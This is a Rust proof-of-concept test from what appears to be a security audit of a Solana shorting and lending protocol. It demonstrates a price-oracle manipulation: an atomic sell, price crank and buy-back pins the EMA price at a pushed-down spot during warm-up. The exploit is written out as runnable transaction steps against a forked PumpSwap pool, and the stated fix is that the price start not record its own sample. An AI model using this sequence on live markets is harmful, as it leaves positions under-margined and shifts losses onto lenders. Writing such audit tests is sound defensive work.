//! PoC 03_run — "The PumpSwap price start keeps P_ema at a pushed-down spot"
//! (prologue.rs:177; shortwin|run|start-sample-pins-warmup-seed).
//!
//! The finding: for a PumpSwap market without a price, the prologue starts the price
//! (`pump_amm::start_price`, `P_ema = P_spot`, `ema_warm = 8`, one ring entry with
//! `lo = P_spot`) AND THEN records the same sample into the open bucket of this second
//! (`observe::record`). The warm-up's `warm_step` re-seeds `P_ema` from a running minimum
//! over this bucket and the newest ring entries, so the start's own pushed `lo` stays in the
//! minimum for all eight integrations and pins `P_ema` at the pushed spot. An attacker who
//! transiently pushes the pool down only for the starting crank (and restores it at once)
//! leaves `P_ema` detached far below the price the pool actually trades at.
//!
//! SAFE behaviour the Fix restores (do not record the start's own sample): the warm-up seeds
//! `P_ema` only from the buckets that later, honest observations record, so `P_ema` rises off
//! the pushed start toward the pool's real spot.
//!
//! This test drives the real instructions on the dumped PumpSwap `mature` pool: list the
//! market (no price), a lender deposits, then the attacker atomically
//! `[sell 2·X0 base (push the spot ~9x down), crank_price (starts + records the pushed spot),
//!  buy 2·X0 back (restore the spot)]`, then a keeper cranks every second through the whole
//! warm-up (the pool back at its honest spot). At the gate (`ema_warm == 0`) the test asserts
//! `P_ema` rose above the pushed start. On 1.0.1 it is pinned exactly at the pushed start, so
//! the final assertion fails.

#![allow(clippy::unwrap_used, clippy::arithmetic_side_effects)]

use shortwin_litesvm_tests::engine::crank_price_ix;
use shortwin_litesvm_tests::errors::ok;
use shortwin_litesvm_tests::pamm::{self, PammCoin, PammMarket, PammTrade, PammUser};
use shortwin_litesvm_tests::pump::cu_limit_ix;
use shortwin_litesvm_tests::{fork, pda, Env};
use shortwin::state::VenueKind;
use shortwin_math::num::WAD;
use solana_signer::Signer;
use shortwin_venue_state::pump as vpump;

const SOL: u64 = 1_000_000_000;

#[test]
fn the_pumpswap_price_start_does_not_pin_p_ema_at_a_pushed_down_spot() {
    // ---- a listed PumpSwap market on the mature pool, with a lender, no price yet ----------
    let (mut env, pool) = Env::fork_pamm_coin(PammCoin::Mature);

    // A 2024-layout curve needs pump's `extend_account` before `create_market` (ARCH §3.2).
    let curve = pda::bonding_curve(&pool.mint);
    if env
        .svm
        .get_account(&curve)
        .is_some_and(|a| a.data.len() < vpump::CURVE_MIN_LEN)
    {
        let payer = env.payer.pubkey();
        ok(env.send(&[pamm::pump_extend_account_ix(&payer, &curve)], &[]));
    }

    let r0 = pool.reserves(&env.svm).expect("pool reserves");
    let b0 = r0.base;

    // List as a new creator (PumpSwap, no price), then a lender deposits and the venue
    // accounts are created (0 warm-up cranks: the price is NOT started yet).
    ok(env.list_pamm(&pool.mint, &pool.base_program));
    let lend = b0 / 20;
    let pm: PammMarket = env.pamm_market_listed(&pool.mint, lend, 0);
    let market = pm.market();

    // Precondition: listed, lenders funded, no price started.
    let m0 = env.market(&market);
    assert_eq!(m0.venue_kind(), Some(VenueKind::PumpSwap));
    assert_eq!(m0.ring_count, 0, "setup: no price before the attacker's crank");
    assert!(
        m0.total_shares.get() > 0,
        "setup: the lender's deposit is live (lenders have funds at risk)"
    );

    // ---- the attacker: pushes the pool down, starts the price, restores the pool ----------
    // The attacker holds 3·X0 base tokens (reachable: anyone can buy/hold the token) and ample
    // WSOL. Planting the balance stands for that acquisition; the trades are real PumpSwap
    // swaps on the dumped ELF.
    let attacker = PammUser::new(&mut env, &pool, 50_000 * SOL);
    let plant = b0.saturating_mul(3);
    fork::set_token_amount(&mut env.svm, &attacker.base, plant);

    let sell_amt = b0.saturating_mul(2);
    let sell = pamm::pamm_trade_ix(
        &env.svm,
        &pool,
        PammTrade::Sell,
        &attacker.kp.pubkey(),
        &attacker.base,
        &attacker.wsol,
        sell_amt,
        0,
    );
    let buy = pamm::pamm_trade_ix(
        &env.svm,
        &pool,
        PammTrade::Buy,
        &attacker.kp.pubkey(),
        &attacker.base,
        &attacker.wsol,
        sell_amt,
        u64::MAX,
    );
    // One atomic transaction: sell down -> crank (price start + record) -> buy back.
    let bundle = vec![cu_limit_ix(1_400_000), sell, crank_price_ix(&pm), buy];
    let akp = attacker.kp.insecure_clone();
    ok(env.send(&bundle, &[&akp]));

    // The price started at the pushed-down spot; the pool is back at its honest spot.
    let m1 = env.market(&market);
    let pushed = m1.ema_price.get();
    assert_eq!(m1.ema_warm, 8, "setup: the start marked the warm-up");
    assert_eq!(m1.ring_count, 1, "setup: the start wrote one ring entry");
    let honest_spot = r0.effective_quote * WAD / u128::from(pool.reserves(&env.svm).unwrap().base);
    assert!(
        pushed * 2 < honest_spot,
        "setup: the attacker's start sample {pushed} is well below the honest spot {honest_spot}"
    );

    // ---- the keeper cranks through the warm-up, the pool at its honest spot ---------------
    let mut cranks = 0u32;
    loop {
        if env.market(&market).ema_warm == 0 {
            break;
        }
        assert!(cranks < 24, "setup: the warm-up did not finish in time");
        env.warp(1);
        ok(env.send(&[crank_price_ix(&pm)], &[]));
        cranks += 1;
    }

    // ---- the gate: has P_ema recovered off the pushed start, or is it pinned? --------------
    let gate_ema = env.market(&market).ema_price.get();
    let honest_now = r0.effective_quote * WAD / u128::from(pool.reserves(&env.svm).unwrap().base);
    let under_margin_x = honest_now / gate_ema.max(1);

    println!("POC-03_run: honest pool spot (×WAD)      = {honest_now}");
    println!("POC-03_run: pushed start spot (×WAD)     = {pushed}");
    println!("POC-03_run: P_ema at the gate (×WAD)     = {gate_ema}  ({cranks} warm-up cranks)");
    println!("POC-03_run: gate P_ema / honest spot     = {} %", gate_ema * 100 / honest_now.max(1));
    println!("POC-03_run: a short opened here is under-margined by ~{under_margin_x}x");

    assert!(
        gate_ema > pushed,
        "HARM: the price start pinned P_ema at the attacker's pushed-down spot. P_ema at the \
         gate = {gate_ema} (×WAD) equals the pushed start {pushed}, not the pool's honest spot \
         {honest_now}; a short opened against this P_ema posts collateral priced ~{under_margin_x}x \
         too low, and the lenders carry the shortfall. The fix (do not record the start's own \
         sample) lets the warm-up's honest buckets lift P_ema off the pushed start."
    );
}
